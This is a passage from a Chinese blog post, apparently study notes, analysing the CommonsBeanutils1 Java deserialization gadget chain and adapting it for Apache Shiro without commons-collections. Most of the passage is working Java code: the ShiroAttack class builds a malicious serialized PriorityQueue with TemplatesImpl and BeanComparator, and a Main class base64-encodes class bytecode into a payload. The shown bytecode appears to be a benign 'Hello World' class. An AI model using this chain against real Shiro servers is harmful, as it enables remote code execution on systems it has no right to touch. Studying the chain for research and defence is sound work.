&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( InvocationTargetException ite ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( NoSuchMethodException nsme ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。</p><p> PropertyUtils.getProperty 这个方法会自动去调用一个JavaBean的getter方法，这个点是任意代码执行的关键。</p><p>在分析<code>TemplatesImpl</code>时，我们调用过<code>getOutputProperties()</code>,它是以get开头，符合getter的定义</p><p>下面是我们之前用到过的TemplatesImpl的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt;<br>TemplatesImpl#defineTransletClasses() -&gt;<br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty( o1, property )<br></code></pre></td></tr></table></figure><p>当o1为TemplatesImpl对象，而property值为outputProperties时，将会自动调用getter，即调用<code>getOutputProperties()</code>，触发代码执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProperty</span><span class="hljs-params">(Object bean, String name)</span><br>        <span class="hljs-keyword">throws</span> IllegalAccessException, InvocationTargetException,<br>        NoSuchMethodException &#123;<br><br>    <span class="hljs-keyword">return</span> (PropertyUtilsBean.getInstance().getProperty(bean, name));<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>所以我们的利用链是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   PriorityQueue.readObject()<br>      ...<br>         TransformingComparator.compare()<br>            InvokerTransformer.transform()<br>               Method.invoke()<br>                  Runtime.exec()<br></code></pre></td></tr></table></figure><p>创建TemplateImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>           ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>       &#125;);<br>       setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>       setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>当<code>BeanComparator</code>构造函数为空时，property为空</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>( <span class="hljs-literal">null</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>所以实例化<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br></code></pre></td></tr></table></figure><p>用这个<code>obj</code>实例化<code>PriorityQueue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>可见，我们添加了两个无害的可以比较的对象进队列中。前文说过， BeanComparator#compare() 中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对两个 1 进行排序。</p><p>初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个1替换成恶意的TemplateImpl 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br></code></pre></td></tr></table></figure><p>完整的利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>奇怪的是这里的evil用不了</p><p>(先埋好坑，以后再来)</p><h1 id="无commons-collections的Shiro反序列化利用"><a href="#无commons-collections的Shiro反序列化利用" class="headerlink" title="无commons-collections的Shiro反序列化利用"></a>无commons-collections的Shiro反序列化利用</h1><p>先看<code>org.apache.commons.collections.comparators.ComparableComparator</code>在哪里使用了</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191238911.png" alt="image-20230224204318231"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">( String property )</span> &#123;<br>    <span class="hljs-built_in">this</span>( property, ComparableComparator.getInstance() );<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个构造函数处，如果没有显式传入<code>Comparator</code>，就默认使用<code>ComparableComparator</code></p><blockquote><p>解释一下什么是显式传入</p><p>在构造函数中，如果调用者明确地传入了一个 Comparator 对象作为参数，就称为“显式传入 Comparator 对象”。例如，下面的代码中就显式地传入了一个自定义的 Comparator 对象，用于对字符串列表进行排序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; stringList = Arrays.asList(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;baz&quot;</span>);<br>Collections.sort(stringList, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;() &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String s1, String s2)</span> &#123;<br>        <span class="hljs-keyword">return</span> s1.compareTo(s2);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>相反，如果在构造函数中没有传入 Comparator 对象，就需要使用默认的比较器来比较对象。</p><p>而ComparableComparator.getInstance() 就是默认的一个新的Comparator</p></blockquote><p>既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p><ul><li><p>实现 java.util.Comparator 接口</p></li><li><p>实现 java.io.Serializable 接口</p></li><li><p>Java、shiro或commons-beanutils自带，且兼容性强</p></li></ul><p>通过IDEA的功能，我们找到一个 <code>CaseInsensitiveComparator</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER<br>                                     = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaseInsensitiveComparator</span>();<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CaseInsensitiveComparator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;, java.io.Serializable &#123;<br>    <span class="hljs-comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">8575799808933029326L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String s1, String s2)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> s1.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> s2.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">min</span> <span class="hljs-operator">=</span> Math.min(n1, n2);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; min; i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> s1.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> s2.charAt(i);<br>            <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                c1 = Character.toUpperCase(c1);<br>                c2 = Character.toUpperCase(c2);<br>                <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                    c1 = Character.toLowerCase(c1);<br>                    c2 = Character.toLowerCase(c2);<br>                    <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                        <span class="hljs-comment">// No overflow because of numeric promotion</span><br>                        <span class="hljs-keyword">return</span> c1 - c2;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n1 - n2;<br>    &#125;<br><br>    <span class="hljs-comment">/** Replaces the de-serialized object. */</span><br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">readResolve</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。</p><p>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,String.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure><p>最后，构造出新的CommonsBeanutils1Shiro利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroAttack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,<br>            String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后我写一个简单的利用程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">ShiroAttack</span> <span class="hljs-variable">attack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroAttack</span>();<br>        <span class="hljs-type">byte</span>[] clazzBytes= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">byte</span>[] payload = attack.getPayload(clazzBytes);<br>        System.out.println(payload);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出为[B@77a567e1</span><br></code></pre></td></tr></table></figure><p>这个输出并不是预期的payload</p><p>这是因为<code>System.out.println(payload)</code> 打印的是字节数组的地址，而不是它的内容。</p><p>要正确地输出 payload 的内容，需要使用 <code>Base64</code> 编码将它转换为一个字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">ShiroAttack</span> <span class="hljs-variable">attack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroAttack</span>();<br>        <span class="hljs-type">byte</span>[] clazzBytes= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">byte</span>[] payload = attack.getPayload(clazzBytes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(payload);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br><span 